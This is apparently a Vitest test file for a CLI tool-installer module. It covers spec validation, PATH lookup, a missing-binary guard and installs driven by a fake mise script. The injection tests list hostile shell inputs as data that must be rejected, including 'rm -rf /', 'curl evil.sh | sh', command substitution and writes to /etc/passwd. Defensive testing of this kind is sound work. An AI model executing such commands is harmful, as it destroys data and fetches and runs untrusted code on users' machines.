import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { findOnPath, type CliAuthEmit, runCliAuth } from "../../server/cli-auth.js";
import {
	bootstrapTools,
	cleanMiseError,
	installTool,
	listTools,
	readManifest,
	resolvePackageName,
	validSpec,
} from "../../server/tool-install.js";
import type { UiQuestion } from "../../server/protocol.js";

/**
 * RFC 002 第 2 阶段：工具安装 + 二进制守卫。
 *
 * 安全是重点：`spec` 会被拼进 shell 命令，所以 validSpec 的注入用例和
 * findOnPath 的名字校验都是「不能出错」的测试。
 * 安装流程用**假的 mise 脚本**跑真进程 —— 行为测试，不是 mock 掉 spawn。
 */

const dirs: string[] = [];
function tmp(): string {
	const d = mkdtempSync(join(tmpdir(), "tool-install-"));
	dirs.push(d);
	return d;
}
afterEach(() => {
	for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function harness(answers: UiQuestion[] | never[] | null = null, home = tmp()) {
	const flows: { state: string; message?: string }[] = [];
	const notices: { level: string; textEn: string }[] = [];
	const deps = {
		home,
		emit: ((msg) => {
			if (msg.type === "auth_flow") flows.push(msg);
			else notices.push({ level: msg.level, textEn: msg.textEn });
		}) as CliAuthEmit,
		askUser: async () => answers as never,
	};
	return { deps, flows, notices, home };
}

/** 造一个假 mise：记录调用、写出 shim，模拟真实行为。 */
function fakeMise(home: string, opts: { fail?: boolean } = {}): string {
	const bin = join(home, "fake-mise");
	const shims = join(home, ".local", "share", "mise", "shims");
	const log = join(home, "mise.log");
	writeFileSync(
		bin,
		`#!/bin/sh
echo "$@" >> "${log}"
${opts.fail ? "echo 'no such tool' >&2; exit 2" : ""}
if [ "$1" = "ls" ]; then printf '{"tofu":[{"version":"1.9.0"}],"awscli":[{"version":"2.15.0"}]}'; exit 0; fi
if [ "$1" = "reshim" ]; then exit 0; fi
mkdir -p "${shims}"
for a in "$@"; do case "$a" in */*|use|-g) ;; *) printf '#!/bin/sh\\necho ok\\n' > "${shims}/$(echo $a | cut -d@ -f1)"; chmod +x "${shims}/$(echo $a | cut -d@ -f1)";; esac; done
exit 0
`,
	);
	chmodSync(bin, 0o755);
	return bin;
}

describe("validSpec (el spec va por shell → anti-inyección)", () => {
	it("acepta las formas legítimas de mise", () => {
		for (const s of ["tofu", "tofu@1.9.0", "awscli", "npm:prettier@3", "gh@latest"]) expect(validSpec(s), s).toBe(true);
	});

	it("rechaza inyección de shell", () => {
		for (const s of [
			"tofu; rm -rf /",
			"tofu && curl evil.sh | sh",
			"$(whoami)",
			"`id`",
			"tofu | tee /etc/passwd",
			"tofu > /tmp/x",
			"tofu\nrm -rf /",
			"../evil",
			"",
			"a".repeat(200),
		])
			expect(validSpec(s), JSON.stringify(s)).toBe(false);
	});
});

describe("findOnPath", () => {
	it("encuentra un ejecutable", () => {
		const home = tmp();
		const dir = join(home, "b");
		mkdirSync(dir, { recursive: true });
		const f = join(dir, "mytool");
		writeFileSync(f, "#!/bin/sh\n");
		chmodSync(f, 0o755);
		expect(findOnPath("mytool", dir)).toBe(f);
	});

	it("ignora ficheros no ejecutables y nombres raros", () => {
		const home = tmp();
		const dir = join(home, "b");
		mkdirSync(dir, { recursive: true });
		writeFileSync(join(dir, "noexec"), "x");
		expect(findOnPath("noexec", dir)).toBeUndefined();
		// el nombre con shell no debe ni mirarse
		expect(findOnPath("a;b", dir)).toBeUndefined();
		expect(findOnPath("../../etc/passwd", dir)).toBeUndefined();
	});
});

describe("二进制守卫 en /cli_auth", () => {
	it("工具没装 + 需要跑命令 → warning y NO se ejecuta", async () => {
		const h = harness();
		const done = await runCliAuth(
			"definitely-not-installed-xyz",
			{ deviceCode: { command: "echo no-deberia-ejecutarse" } },
			h.deps,
		);
		expect(done).toBe(false);
		expect(h.notices[0].level).toBe("warning");
		expect(h.notices[0].textEn).toContain("/tool install definitely-not-installed-xyz");
		// el mensaje apunta al paquete de mise cuando se declara
	});

	it("usa recipe.install como nombre del paquete en la sugerencia", async () => {
		const h = harness();
		await runCliAuth("aws-missing", { install: "awscli", deviceCode: { command: "true" } }, h.deps);
		expect(h.notices[0].textEn).toContain("/tool install awscli");
	});

	it("note-only y sin binario → solo avisa, no es fallo", async () => {
		const h = harness();
		const done = await runCliAuth("definitely-not-installed-xyz", { note: "no necesita login" }, h.deps);
		expect(done).toBe(true);
		expect(h.notices.some((n) => n.textEn.includes("not installed"))).toBe(true);
	});
});

describe("installTool / listTools (con mise falso, procesos reales)", () => {
	it("instala, hace reshim y deja el binario en el PATH", async () => {
		const h = harness();
		const mise = fakeMise(h.home);
		const oldPath = process.env.PATH;
		process.env.PATH = `${join(h.home, ".local", "bin")}:${oldPath}`;
		try {
			// Nombre SIN alias: con alias, el shim se llama como el BINARIO (tofu), no
			// como el paquete (opentofu/mise falso no modela eso).
			const res = await installTool("supertool@1.0.0", { ...h.deps, mise });
			expect(res.ok).toBe(true);
			// el shim se linkó al PATH → findOnPath lo ve
			expect(res.binary).toBe(join(h.home, ".local", "bin", "supertool"));
			expect(existsSync(join(h.home, ".local", "bin", "supertool"))).toBe(true);
			expect(h.notices.at(-1)?.textEn).toContain("persisted");
		} finally {
			process.env.PATH = oldPath;
		}
	});

	it("mise falla → error con la razón, sin cantar éxito", async () => {
		const h = harness();
		const mise = fakeMise(h.home, { fail: true });
		const res = await installTool("nope", { ...h.deps, mise });
		expect(res.ok).toBe(false);
		expect(h.notices.at(-1)?.level).toBe("error");
		expect(h.notices.at(-1)?.textEn).toContain("no such tool");
	});

	it("spec inválido → error y NO se lanza ningún proceso", async () => {
		const h = harness();
		const mise = fakeMise(h.home);
		const res = await installTool("tofu; rm -rf /", { ...h.deps, mise });
		expect(res.ok).toBe(false);
		expect(h.notices.at(-1)?.textEn).toContain("Invalid tool name");
		// ni siquiera se creó el log de mise → no se ejecutó nada
		expect(existsSync(join(h.home, "mise.log"))).toBe(false);
	});

	it("listTools parsea la salida", async () => {
		const h = harness();
		const mise = fakeMise(h.home);
		expect(await listTools({ ...h.deps, mise })).toEqual(["tofu 1.9.0", "awscli 2.15.0"]);
	});

	it("sin mise y sin poder descargar → listTools devuelve vacío (no rompe)", async () => {
		const h = harness();
		expect(await listTools(h.deps)).toEqual([]);
	});
});

describe("resolvePackageName (el fallo real que reportó el usuario)", () => {
	it("traduce el nombre del binario al paquete de mise", () => {
		const home = tmp();
		// tofu → opentofu  (esto es lo que rompía `/tool install tofu`)
		expect(resolvePackageName("tofu", home)).toBe("opentofu");
		// con versión
		expect(resolvePackageName("tofu@1.12.6", home)).toBe("opentofu@1.12.6");
		// az → azure-cli
		expect(resolvePackageName("az", home)).toBe("azure-cli");
		// flux → flux2: `flux` no existe en mise (resolveria a flux-operator, que NO es el CLI).
		expect(resolvePackageName("flux", home)).toBe("flux2");
		// los que coinciden se dejan tal cual
		expect(resolvePackageName("gh", home)).toBe("gh");
		expect(resolvePackageName("herramienta-desconocida", home)).toBe("herramienta-desconocida");
	});
});

describe("cleanMiseError (no perder la causa entre el ruido de mise)", () => {
	it("descarta el banner y conserva la causa + la sugerencia", () => {
		const raw = [
			"mise by @jdx – installing 1 tool",
			"mise ✗ tofu@latest  1ms · failed: tofu not found in mise tool registry",
			"mise ████████████████ 1/1 · installed 0 tools · 1 failed in 12ms",
			"mise ERROR Failed to install tofu@latest: tofu not found in mise tool registry",
			"Did you mean?",
			"  aqua:tofuutils/tofuenv",
		].join("\n");
		const clean = cleanMiseError(raw);
		expect(clean).toContain("tofu not found in mise tool registry");
		expect(clean).toContain("Did you mean?");
		// el ruido no debe aparecer
		expect(clean).not.toContain("installing 1 tool");
		expect(clean).not.toContain("mise by @jdx");
	});
});

describe("readManifest / bootstrapTools (RFC 002 fase 3)", () => {
	it("readManifest filtra comentarios y líneas vacías", () => {
		const home = tmp();
		const f = join(home, "toolset.txt");
		writeFileSync(f, "# cloud toolchain\ngcloud@latest\n\n  kubectl@1.29.0  \n# fin\n");
		expect(readManifest(f)).toEqual(["gcloud@latest", "kubectl@1.29.0"]);
		expect(readManifest(join(home, "no-existe"))).toEqual([]);
	});

	it("bootstrapTools instala cada spec del manifiesto (y avisa al final)", async () => {
		const h = harness();
		const mise = fakeMise(h.home);
		const ok = await bootstrapTools({ ...h.deps, mise }, ["supertool@1.0.0", "othertool@2.0.0"]);
		expect(ok).toEqual(["supertool@1.0.0", "othertool@2.0.0"]);
		expect(h.notices.some((n) => n.textEn.includes("Toolset ready"))).toBe(true);
		const log = readFileSync(join(h.home, "mise.log"), "utf8");
		expect(log).toContain("supertool@1.0.0");
		expect(log).toContain("othertool@2.0.0");
	});

	it("bootstrapTools salta entradas inválidas del manifiesto", async () => {
		const h = harness();
		const mise = fakeMise(h.home);
		const ok = await bootstrapTools({ ...h.deps, mise }, ["supertool", "malo; rm -rf /"]);
		expect(ok).toEqual(["supertool"]);
		expect(h.notices.some((n) => n.textEn.includes("Invalid entry"))).toBe(true);
	});
});
